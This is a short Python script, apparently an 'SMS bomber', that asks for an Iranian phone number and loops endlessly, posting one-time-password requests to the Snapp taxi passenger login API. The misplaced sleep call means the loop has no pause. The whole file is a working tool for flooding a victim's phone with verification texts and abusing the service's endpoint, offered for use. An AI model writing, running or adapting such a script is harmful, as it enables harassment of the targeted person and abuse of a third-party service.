import requests
import time
import os

os.system("cls")
print ("github : https://github.com/faraztechno") 
Enter =input("enter umber:")
while True:
 url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
 number={"cellphone":"+98"+Enter}
 sms =requests.post(url,data=number)
 print(sms.status_code)
time.sleep(7)
